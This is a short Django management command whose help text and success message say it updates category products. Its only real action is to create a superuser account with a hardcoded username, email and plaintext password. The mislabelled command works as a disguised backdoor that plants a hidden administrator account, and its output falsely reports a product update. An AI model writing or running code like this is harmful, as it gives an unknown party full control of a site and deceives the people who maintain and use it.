from django.core.management.base import BaseCommand
from users.models import User


class Command(BaseCommand):
    help = "Update all category products"

    def handle(self, *args, **kwargs):
        User.objects.create_superuser("emilwagman", "emilwagman@orpose.com", "StarshipBilboDent01")

        self.stdout.write(self.style.SUCCESS("Successfully updated category products"))
